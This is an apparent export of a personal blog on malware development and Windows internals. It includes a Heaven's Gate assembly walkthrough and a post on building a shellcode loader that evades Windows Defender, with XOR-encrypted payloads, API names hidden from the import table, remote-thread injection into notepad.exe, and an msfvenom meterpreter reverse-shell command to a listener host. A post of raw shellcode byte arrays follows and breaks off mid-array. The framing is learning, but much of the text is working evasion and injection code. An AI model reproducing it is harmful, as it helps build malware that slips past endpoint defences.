pop esi\t; pop ebp\t; restore ebp retn (4*2)\t; return to caller (cleaning up our two function params) go_all_native: mov edi, [esp]\t; edi is the wow64 return address jmp dword far [edx]\t; perform the far jump, which will return to the caller of go_all_native native_x64: [bits 64]\t; we are now executing native x64 code... xor rax, rax\t; zero rax push rdi\t; save rdi (edi being our wow64 return address) call rsi\t; call our native x64 function (the param for our native x64 function is allready in rcx) pop rdi\t; restore rdi (edi being our wow64 return address) push rax\t; simply push it to alloc some space mov dword [rsp+4], wow64_code_segment\t; set the wow64 code segment mov dword [rsp], edi\t; set the address we want to jump to (the return address from the go_all_native call) jmp dword far [rsp]\t; perform the far jump back to the wow64 caller... the code does the following things:\ninitializes the stack frame properly. takes the pfunction (function to execute) and dwparameter from the stack using ebp + offsets and saves it into registers for later usage. calls delta. in delta we prepare the opening of the gate: pop the last inserted value in the stack (which is the saved eip value, as the call instruction inserts eip so we keep track of what we have to execute after delta). this is a trick to obtain the address of the code that is being executed dinamically. once we obtain the address of the instruction in which we are dinamically, we add the offset to the native_x64 code section, having the dynamic address of the native_x64 code section. expand the stack frame and add 2 variables: the 0x33 code segment, corresponding as a 64-bit execution code segment (this will be used when jumping into 64-bit context), and the dynamic address of native_x64. both are stored in the stack, the last is pointed by edx, and the other is pointed by edx+4. call go_all_native. in go_all_native, we go inside the gate: we save the 32-bit context return address (stored in esp by the call operation) into edi. we perform a far jump to the memory address stored in edx, which is the native_x64 starting point. also, the edx+4 address is used in the far jump to change the code segment to the 0x33 code segment, corresponding to a 64-bit code segment. now the cpu is ready to understand and execute 64-bit code. we have opened the heaven\u0026rsquo;s gate. in native_x64, we execute our x64 arbitrary code and then return to the 32-bit context: we reset rax. we push rdi into the stack, as we stored the 32-bit return address in edi. we will use this to return to the 32-bit code. we call rsi, which already has the pfunction (the address of the function to execute). once our function has been executed, we restore rdi popping its value from the stack (we saved it previously). we add the 32-bit code address into the stack, and the 32-bit code segment (0x23), to, lastly, perform another far jmp to the 32-bit address using the 32-bit code segment. we are finally closing the heaven\u0026rsquo;s gate. after going back to the 32-bit code, some cleaning is done in order to reestructure the stack. we return to the 32-bit code that triggered this shellcode. as a homework, i have to study why the code does some operations for amd cpus. to be honest, this has been one of the most interesting topics i have researched within this field. i have learnt a lot from os internals, assembly and i have not only discovered an interesting technique, but i have understood how does it works (or, at least, i have that impression). i personally do not like to use things that are shady to me, so this is one of the best things to take from this learning path.\nlet me know what is wrong or tell me your doubts on this topic by contacting me via linkedin. i\u0026rsquo;ll be glad to hear from you.\njaco\n","title":"Understanding Heaven´s Gate"},{"date":"2024-02-28","image":"","imageAlt":"","link":"http://localhost:1313/about/","summary":"\u003cp\u003eHello! I am \u003cstrong\u003eJaco\u003c/strong\u003e. I love computers and technology in general, and I am currently working as a Cyber Security Evaluator at \u003ca href=\"https://www.jtsec.es/es\"\u003ejtsec Beyond IT Security\u003c/a\u003e. I created this blog as a way to store my knowledge (my memory is not the best) and as a way to display some of the knowledge I am learning over the time.\u003c/p\u003e","tags":[],"text":"hello! i am jaco. i love computers and technology in general, and i am currently working as a cyber security evaluator at jtsec beyond it security. i created this blog as a way to store my knowledge (my memory is not the best) and as a way to display some of the knowledge i am learning over the time.\nin my job, my main expertise field is web application pentesting, but i have also evaluated mobile applications and edrs and i am not scared to learn more about new frameworks, methodologies, tools or systems.\nalthough this blog is not for a specific topic, i will mainly cover malware development and os internals topics as they are the main topic i like to study when i am not working at my job. in the future, i would like to develop a course covering these topics.\nnavigate to the posts section to see all of my work in this platform; you can also contact me in my socials by clicking at the icons on the top.\nsee you!\njaco\n","title":"Hey!"},{"date":"2024-02-28","image":"","imageAlt":"","link":"http://localhost:1313/posts/firststeps/","summary":"\u003ch2 id=\"prelude\"\u003ePrelude\u003c/h2\u003e\n\u003cp\u003eAround this last month I have been digging into the Malware Development world. I have always wanted to expand my knowledge within this field, and I felt like it was the moment to do so.\u003c/p\u003e\n\u003cp\u003eAs mentioned in many other blogposts, \u003ca href=\"https://www.google.com/search?client=firefox-b-d\u0026amp;q=sektor7+malware+development\"\u003eSektor7 Malware Development Essentials\u003c/a\u003e course was a good point to start. Nevertheless, I found this course very short and I felt like most of the important concepts are ignored (e.g., \u003cstrong\u003ewhat is a handle?\u003c/strong\u003e) and are just used like if I already know them.\u003c/p\u003e","tags":["evasion","firststeps","loader","maldev"],"text":"prelude around this last month i have been digging into the malware development world. i have always wanted to expand my knowledge within this field, and i felt like it was the moment to do so.\nas mentioned in many other blogposts, sektor7 malware development essentials course was a good point to start. nevertheless, i found this course very short and i felt like most of the important concepts are ignored (e.g., what is a handle?) and are just used like if i already know them.\nbecause of that, i actually recommend take a little stop on each of the things that the course shows you in order to understand what does each line do and also do some personal research on each of the things that the course provides.\ni personally made questions like:\nwhat are the parameters of this function? why is this function called in the code? how could i develop this in a way that it could be more stealthy? what are these compile options? i wanted to make sure that i really learnt from this course and compiling and execute the code they give you is not the way to do it. i personally recommend to watch their videos, take some notes, and reproduce and execute the code in your personal project files. do not be scared to improve or modify the code they give you if you think that can be useful.\nthe result of following these steps was a final course project in which i included all of the techniques given in the course to avoid detection (mainly static detection, it is a basic course) combined with am extra technique that made me bypass windows defender sandbox analysis.\nplease note that i have just started to learn about these things and that i can be wrong; feel free to contact me at any of my social media to improve the quality of this post and my content overall.\nevasive? loader/injector the final project consists on a shellcode loader/injector (let\u0026rsquo;s use injector from now on). this shellcode injector is able to bypass windows defender with a meterpreter x64 shellcode at the day of this post (2024/03/05) with cloud protection enabled.\nedit: a week after this post was created, the dropper is not anymore evasive and is detected (dinamically) by defender. i personally thought that this dropper is not stealthy enough to be evasive and a lot of evasive measures can (and will) be added to this dropper in the future. this has just started :p\nthis injector has the following properties:\nit is an executable (.exe) program. no dll version for now. the shellcode is stored as a resource and \u0026ldquo;encrypted\u0026rdquo; using xor. the windows api calls are calculated in run-time using the run-time dynamic linking technique. this corresponds to the api obfuscation technique from my fellas of unprotect project. the strings to calculate the pointer to the api functions using the aforementioned technique are also encrypted with the same xor key used for the shellcode, in order to obfuscate the strings. the xor key is also stored as a resource in the executable. the program in which it injects into is notepad.exe. the injector obtains the pid given the process name and uses the pid to inject into. the program is compiled as a windows subsystem program, and not as a console program, in order to avoid a cmd popping on screen when the dropper gets executed. the api calls performed in this executable are simple:\nfindresource and loadresource to obtain the embedded resources in the executable. virtualalloc, rtlmovememory, virtualallocex, writeprocessmemory, virtualprotectex and createremotethread for the injection technique. getprocaddress and getmodulehandle to perform the iat hiding technique. createtoolhelp32snapshot, process32first and process32next to obtain the pid given a process name. the injector has the following phases:\nit starts obtaining the xor key from the resources section of the file. using this key to decrypt the string names of the api calls, uses the relevant api functions to obtain the pid from the process name specified as a variable. the process name is hardcoded into the program as a real malware would do; otherwise, we would need to call this dropper with arguments (not a real case most of the time). notepad.exe was used as an example, but it could be performed with more common processes as explorer.exe. just modify the process name variable inside the dropper. the dropper allocates memory in its own process space and stores the shellcode embedded as a resource in this memory region. note that the shellcode is stored in this region but not executed, as this is an intermediate step to then move the shellcode to the target process. using this obtained pid, the injector opens a handle to the process with the given pid and allocates memory space within the process region. the shellcode is then moved from the region that was previously created to this region. a remote thread pointing to the remote memory region containing the shellcode is started. the result is a thread in the remote process executing our shellcode.\nfinding pid given process name the used windows api functions to perform the process injection technique require the pid of the process to inject into. a function that dinamically obtains the pid of a given process name at runtime was implemented in the injector using some of the windows api calls.\nthe function is the following:\nint findmyproc(wchar_t* procname) { handle hsnapshot; // handle to the system process snapshot. processentry32 pe; int pid = 0; bool hresult; printf(\u0026#34;searching for the process %ls to get its pid...\\n\u0026#34;, procname); // snapshot of all processes in the system unsigned char createtoolhelp32snapshotencrypted[] = { 0x2a, 0xc4, 0xab, 0x42, 0x50, 0x6d, 0xbe, 0x0c, 0x0f, 0xf3, 0xcb, 0xe1, 0x66, 0x62, 0x98, 0xba, 0xcf, 0xd0, 0x42, 0xc9, 0x58, 0x3b, 0x93, 0xa2, 0xb3 }; xor(createtoolhelp32snapshotencrypted, sizeof(createtoolhelp32snapshotencrypted), key, key_len); auto const pcreatetoolhelp32snapshot = reinterpret_cast\u0026lt;lpvoid(winapi*)(dword dwflags, dword th32processid)\u0026gt;( getprocaddress(hkernel32, (lpcstr)createtoolhelp32snapshotencrypted) ); hsnapshot = pcreatetoolhelp32snapshot(th32cs_snapprocess, 0); if (hsnapshot == invalid_handle_value) return 0; // it is neccesary to initialize the size of the process entry. /* before calling the process32first function, set this member to sizeof(processentry32). if you do not initialize dwsize, process32first fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */ pe.dwsize = sizeof(processentry32w); // retrieve infrormation about first process encountered in a system snapshot unsigned char process32firstwencrypted[] = { 0x39, 0xc4, 0xa1, 0x40, 0x41, 0x7b, 0x99, 0x50, 0x52, 0xd9, 0xca, 0xf6, 0x79, 0x66, 0xfc, 0x88 }; xor(process32firstwencrypted, sizeof(process32firstwencrypted), key, key_len); auto const pprocess32firstw = reinterpret_cast\u0026lt;bool(winapi*)(handle hsnapshot, lpprocessentry32 lppe)\u0026gt;( getprocaddress(hkernel32, (lpcstr)process32firstwencrypted) ); hresult = pprocess32firstw(hsnapshot, \u0026amp;pe); // get information about the obtained process using its handle // and exit if unsuccessful unsigned char process32nextwencrypted[] = { 0x39, 0xc4, 0xa1, 0x40, 0x41, 0x7b, 0x99, 0x50, 0x52, 0xd1, 0xc6, 0xfc, 0x7e, 0x45, 0xab }; xor(process32nextwencrypted, sizeof(process32nextwencrypted), key, key_len); auto const pprocess32nextw = reinterpret_cast\u0026lt;bool(winapi*)(handle hsnapshot, lpprocessentry32 lppe)\u0026gt;( getprocaddress(hkernel32, (lpcstr)process32nextwencrypted) ); while (pprocess32nextw(hsnapshot, \u0026amp;pe)) { if (lstrcmpw(pe.szexefile, procname) == 0) { pid = pe.th32processid; break; } } // close the open handle; we don\u0026#39;t need it anymore closehandle(hsnapshot); return pid; } note that this function will return the first pid occurrence related to the process specified; if there are two process called notepad.exe, it will return the first one that is found in the snapshot obtained calling createtoolhelp32snapshot (a lot of factors influence in the first returned pid).\nevasion techniques here is a detailed overview of each of the things i implemented in the program to make it stealthier, both statically and dinamically. overall, i think that it is missing a lot of evasion techniques but as i repeated before, i am just learning slowly to know what i am exactly doing without copypasting.\nwindows subsystem the program is compiled specifying windows as the subsystem and not console as the subsystem in order to avoid the os allocating a console when the file is executed. in order to do this, we first need to compile the file specifying windows as the subsystem flag:\nafter that, the linker will not search for the main function; instead, it will search for the following function:\nint winapi winmain(hinstance,histance,lpstr,int); therefore we must replace our main function with winmain: iat hiding + encrypted strings the api calls are resolved dinamically, therefore, not appearing in the iat of the file. let\u0026rsquo;s see the snippet of the code to obfuscate an api call:\n// virtualallocex\\0 char array encrypted with the xor key unsigned char virtualallocexencrypted[] = { 0x3f, 0xdf, 0xbc, 0x57, 0x51, 0x69, 0x86, 0x22, 0x0c, 0xf3, 0xcc, 0xe7, 0x4f, 0x6a, 0xab }; // decrypting the string xor(virtualallocexencrypted, sizeof(virtualallocexencrypted), key, key_len); // obtaining the pointer to the virtualallocex function at runtime auto const pvirtualallocex = reinterpret_cast\u0026lt;lpvoid(winapi*)(handle hprocess, lpvoid lpaddress, size_t dwsize, dword flallocationtype, dword flprotect)\u0026gt;( getprocaddress(getmodulehandle(\u0026#34;kernel32.dll\u0026#34;), (lpcstr)virtualallocexencrypted) ); // calling the function using the pointer lpbufferaddress = pvirtualallocex(hopenprocess, null, shellcode_len, (mem_reserve | mem_commit), page_execute_readwrite); the string is encrypted to not use getprocaddress and insert the hardcoded \u0026ldquo;virtualallocex\u0026rdquo; function name. this would result in the function name appearing as a string in the file. given this technique, pe analyzers do not display any information about these calls in the iat nor in the strings. we can see an example with pexplorer, in which none of the used imports is being shown in the iat:\nalso, strings related to these calls do not appear in the strings section:\nanalyzing the loader with threatcheck threatcheck is an interesting tool designed by rastamouse that allows us to pinpoint the exact bytes that windows defender will flag when scanning the file.\nwe can use this tool with our loader to verify if defender flags our file: we can see that at first sight defender does not seem to detect our loader.\nused shellcode the used shellcode is generated from msfvenom and it is a meterpreter reverse tcp shell. the shellcode used is staged and that means that it is lighter, but there is a download of the rest of the shellcode after the initial shellcode has been executed.\nmsfvenom --platform windows --arch x64 -p windows/x64/meterpreter_reverse_tcp lhost=192.168.0.143 lport=443 -f raw -o meterpreter exitfunc=thread defender bypass poc here is a video using this injector to load the previous shellcode with defender on. note that all of the functionalities of defender are activated but the automatic sample submission (for obvious reasons):\nthere should have been a video here but your browser does not seem to support it. we can see that no console is being displayed and that it looks stealthy.\nfuture research areas this post is just the start of a big project i have in hand. the main objective of my project is to understand how os (specially windows) works, and how edr solutions work, in order to understand the most advanced edr evasion techniques and how can i implement my own techniques to evade edr using the os facilities.\ni will update this injector when i discover more techniques, but here are some of the possible upgrade areas:\nchange the injected shellcode for a custom one (imho i am far far away from developing a custom shellcode, but i am sure i will do it at the end) change the encryption algorithm used to a stronger one (rc6, for example). develop the injector in another language (c#, go, nim\u0026hellip;). obtain the key to decrypt the resources from a server; this way, without proper connection to the server the injected shellcode does not work (ideal for edrs that have a offline sandbox environment). overall, use more advanced evasion techniques (indirect syscalls, for example). i will start soon sektor7 malware development intermediate course and start reading windows internals book, to complement my knowledge.\ni hope you liked reading my post, feel free to contact me at any of my socials for any question/aclaration or just to give me tips, and i hope we see each other soon!\njasco\n","title":"My first steps in MalDev"},{"date":"2024-02-28","image":"","imageAlt":"","link":"http://localhost:1313/posts/random_stuff/","summary":"\u003cp\u003eCustom function declaration. Used when hooking, to get a pointer to the original function to get it dinamically resolved via IAT and then override this pointer, or to craft a new function that points to a shellcode with the function behavior (used in reflective DLL shellcode)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCase of getting the function pointer to a resolving Windows API call:\u003c/strong\u003e\u003c/p\u003e","tags":["evasion","firststeps","loader","maldev"],"text":"custom function declaration. used when hooking, to get a pointer to the original function to get it dinamically resolved via iat and then override this pointer, or to craft a new function that points to a shellcode with the function behavior (used in reflective dll shellcode)\ncase of getting the function pointer to a resolving windows api call:\n// declaring the function pointer to a resolving windows api call int (winapi* ptounicodeex) (uint wvirtkey, uint wscancode, const byte *lpkeystate, lpwstr pwszbuff, int cchbuff, uint wflags, hkl dwhkl) = tounicodeex; // call the function using its pointer ptounicodeex(wvirtkey, wscancode, lpkeystate, pwszbuff, cchbuff, wflags, dwhkl); case of getting the function pointer to a memory zone where the function is implemented via shellcode:\n// declaring the function pointer to a resolving windows api call typedef dword (winapi * executex64)( x64function pfunction, dword dwparameter ); // declaring the function pointer instance to null executex64 pexecutex64 = null; // allocating function for the function pointer pexecutex64 = (executex64)virtualalloc( null, sizeof(sh_executex64), mem_reserve|mem_commit, page_readwrite ); // copying the shellcode to the function pointer location memcpy( pexecutex64, sh_executex64, sh_executex64_len ); // call the function using its pointer pexecutex64( px64function, (dword)ctx ); ","title":"Random stuff"},{"date":"2024-02-28","image":"","imageAlt":"","link":"http://localhost:1313/posts/shellcodes/","summary":"\u003cp\u003eShellcodes that will be useful for testing/developing your malware.\u003c/p\u003e\n\u003cp\u003eI usually work on the same OS and with the same Compiler version for better reproducibility so here are my specs:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWindows 10 Pro 22H2\n\u003cul\u003e\n\u003cli\u003eOS Build \u003cstrong\u003e19045.4046\u003c/strong\u003e\u003c/li\u003e\n\u003cli\u003eMSVC vc.exe compiler (64-bit and 32-bit) version \u003cstrong\u003e19.41.34123\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eShellcodes are not encrypted. You should encrypt them if you want evasion, as these shellcodes are public and not crafted manually by me.\u003c/p\u003e","tags":["lab","maldev","shellcodes"],"text":"shellcodes that will be useful for testing/developing your malware.\ni usually work on the same os and with the same compiler version for better reproducibility so here are my specs:\nwindows 10 pro 22h2 os build 19045.4046 msvc vc.exe compiler (64-bit and 32-bit) version 19.41.34123 shellcodes are not encrypted. you should encrypt them if you want evasion, as these shellcodes are public and not crafted manually by me.\n64-bit (64-bit) messagebox unsigned char shellcode[] = { 0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41, 0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72, 0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20, 0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54, 0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00 }; (64-bit) calc.exe reflective dll warning! shellcode is too big. careful when copying, as it sometime crashes my visual studio when pasting.\nunsigned char payload_calc_reflective[] = { 0xe8, 0x0, 0x0, 0x0, 0x0, 0x59, 0x49, 0x89, 0xc8, 0x48, 0x81, 0xc1, 0x23, 0xb, 0x0, 0x0, 0xba, 0xc0, 0x11, 0x78, 0x3, 0x49, 0x81, 0xc0, 0x23, 0xa5, 0x1, 0x0, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x30, 0xc7, 0x44, 0x24, 0x20, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x5, 0x0, 0x0, 0x0, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x44, 0x89, 0x48, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x6c, 0x24, 0x90, 0x48, 0x81, 0xec, 0x70, 0x1, 0x0, 0x0, 0x45, 0x33, 0xff, 0xc7, 0x45, 0xd8, 0x6b, 0x0, 0x65, 0x0, 0x48, 0x8b, 0xf1, 0x4c, 0x89, 0x7d, 0xf8, 0xb9, 0x13, 0x9c, 0xbf, 0xbd, 0x4c, 0x89, 0x7d, 0xc8, 0x4c, 0x89, 0x7d, 0x8, 0x45, 0x8d, 0x4f, 0x65, 0x4c, 0x89, 0x7d, 0x10, 0x44, 0x88, 0x4d, 0xbc, 0x44, 0x88, 0x4d, 0xa2, 0x4c, 0x89, 0x7d, 0x0, 0x4c, 0x89, 0x7d, 0xf0, 0x4c, 0x89, 0x7d, 0x18, 0x44, 0x89, 0x7d, 0x24, 0x44, 0x89, 0x7c, 0x24, 0x2c, 0xc7, 0x45, 0xdc, 0x72, 0x0, 0x6e, 0x0, 0xc7, 0x45, 0xe0, 0x65, 0x0, 0x6c, 0x0, 0xc7, 0x45, 0xe4, 0x33, 0x0, 0x32, 0x0, 0xc7, 0x45, 0xe8, 0x2e, 0x0, 0x64, 0x0, 0xc7, 0x45, 0xec, 0x6c, 0x0, 0x6c, 0x0, 0xc7, 0x44, 0x24, 0x40, 0x53, 0x6c, 0x65, 0x65, 0xc6, 0x44, 0x24, 0x44, 0x70, 0xc7, 0x44, 0x24, 0x58, 0x4c, 0x6f, 0x61, 0x64, 0xc7, 0x44, 0x24, 0x5c, 0x4c, 0x69, 0x62, 0x72, 0xc7, 0x44, 0x24, 0x60, 0x61, 0x72, 0x79, 0x41, 0xc7, 0x44, 0x24, 0x48, 0x56, 0x69, 0x72, 0x74, 0xc7, 0x44, 0x24, 0x4c, 0x75, 0x61, 0x6c, 0x41, 0xc7, 0x44, 0x24, 0x50, 0x6c, 0x6c, 0x6f, 0x63, 0xc7, 0x44, 0x24, 0x68, 0x56, 0x69, 0x72, 0x74, 0xc7, 0x44, 0x24, 0x6c, 0x75, 0x61, 0x6c, 0x50, 0xc7, 0x44, 0x24, 0x70, 0x72, 0x6f, 0x74, 0x65, 0x66, 0xc7, 0x44, 0x24, 0x74, 0x63, 0x74, 0xc7, 0x45, 0xa8, 0x46, 0x6c, 0x75, 0x73, 0xc7, 0x45, 0xac, 0x68, 0x49, 0x6e, 0x73, 0xc7, 0x45, 0xb0, 0x74, 0x72, 0x75, 0x63, 0xc7, 0x45, 0xb4, 0x74, 0x69, 0x6f, 0x6e, 0xc7, 0x45, 0xb8, 0x43, 0x61, 0x63, 0x68, 0xc7, 0x44, 0x24, 0x78, 0x47, 0x65, 0x74, 0x4e, 0xc7, 0x44, 0x24, 0x7c, 0x61, 0x74, 0x69, 0x76, 0xc7, 0x45, 0x80, 0x65, 0x53, 0x79, 0x73, 0xc7, 0x45, 0x84, 0x74, 0x65, 0x6d, 0x49, 0x66, 0xc7, 0x45, 0x88, 0x6e, 0x66, 0xc6, 0x45, 0x8a, 0x6f, 0xc7, 0x45, 0x90, 0x52, 0x74, 0x6c, 0x41, 0xc7, 0x45, 0x94, 0x64, 0x64, 0x46, 0x75, 0xc7, 0x45, 0x98, 0x6e, 0x63, 0x74, 0x69, 0xc7, 0x45, 0x9c, 0x6f, 0x6e, 0x54, 0x61, 0x66, 0xc7, 0x45, 0xa0, 0x62, 0x6c, 0xe8, 0x7f, 0x8, 0x0, 0x0, 0xb9, 0xb5, 0x41, 0xd9, 0x5e, 0x48, 0x8b, 0xd8, 0xe8, 0x72, 0x8, 0x0, 0x0, 0x4c, 0x8b, 0xe8, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x8d, 0x45, 0xd8, 0xc7, 0x45, 0x20, 0x18, 0x0, 0x18, 0x0, 0x4c, 0x8d, 0x4c, 0x24, 0x38, 0x48, 0x89, 0x45, 0x28, 0x4c, 0x8d, 0x45, 0x20, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0xd3, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x48, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0xc8, 0xc7, 0x44, 0x24, 0x28, 0xc, 0x0, 0xc, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x68, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0x0, 0xc7, 0x44, 0x24, 0x28, 0xe, 0x0, 0xe, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8d, 0x45, 0xa8, 0xc7, 0x44, 0x24, 0x28, 0x15, 0x0, 0x15, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x4c, 0x8d, 0x4d, 0x8, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x78, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0x10, 0xc7, 0x44, 0x24, 0x28, 0x13, 0x0, 0x13, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0xf0, 0xc7, 0x44, 0x24, 0x28, 0x5, 0x0, 0x5, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x45, 0x90, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0x18, 0xc7, 0x44, 0x24, 0x28, 0x13, 0x0, 0x13, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x58, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0xf8, 0xc7, 0x44, 0x24, 0x28, 0xc, 0x0, 0xc, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x4c, 0x39, 0x7d, 0xc8, 0xf, 0x84, 0x1d, 0x7, 0x0, 0x0, 0x4c, 0x39, 0x7d, 0x0, 0xf, 0x84, 0x13, 0x7, 0x0, 0x0, 0x4c, 0x39, 0x7d, 0xf0, 0xf, 0x84, 0x9, 0x7, 0x0, 0x0, 0x4c, 0x39, 0x7d, 0x8, 0xf, 0x84, 0xff, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x55, 0x10, 0x48, 0x85, 0xd2, 0xf, 0x84, 0xf2, 0x6, 0x0, 0x0, 0x48, 0x63, 0x7e, 0x3c, 0x48, 0x3, 0xfe, 0x81, 0x3f, 0x50, 0x45, 0x0, 0x0, 0xf, 0x85, 0xdf, 0x6, 0x0, 0x0, 0xb8, 0x64, 0x86, 0x0, 0x0, 0x66, 0x39, 0x47, 0x4, 0xf, 0x85, 0xd0, 0x6, 0x0, 0x0, 0x45, 0x8d, 0x4f, 0x1, 0x44, 0x84, 0x4f, 0x38, 0xf, 0x85, 0xc2, 0x6, 0x0, 0x0, 0xf, 0xb7, 0x4f, 0x14, 0x41, 0x8b, 0xdf, 0x48, 0x83, 0xc1, 0x24, 0x66, 0x44, 0x3b, 0x7f, 0x6, 0x73, 0x25, 0x44, 0xf, 0xb7, 0x47, 0x6, 0x48, 0x3, 0xcf, 0x44, 0x39, 0x79, 0x4, 0x8b, 0x47, 0x38, 0xf, 0x45, 0x41, 0x4, 0x3, 0x1, 0x48, 0x8d, 0x49, 0x28, 0x3b, 0xc3, 0xf, 0x46, 0xc3, 0x8b, 0xd8, 0x4d, 0x2b, 0xc1, 0x75, 0xe3, 0x48, 0x8d, 0x4d, 0x38, 0xff, 0xd2, 0x8b, 0x55, 0x3c, 0x44, 0x8b, 0xc2, 0x44, 0x8d, 0x72, 0xff, 0xf7, 0xda, 0x44, 0x3, 0x77, 0x50, 0x49, 0x8d, 0x48, 0xff, 0x8b, 0xc2, 0x4c, 0x23, 0xf0, 0x8b, 0xc3, 0x48, 0x3, 0xc8, 0x49, 0x8d, 0x40, 0xff, 0x48, 0xf7, 0xd0, 0x48, 0x23, 0xc8, 0x4c, 0x3b, 0xf1, 0xf, 0x85, 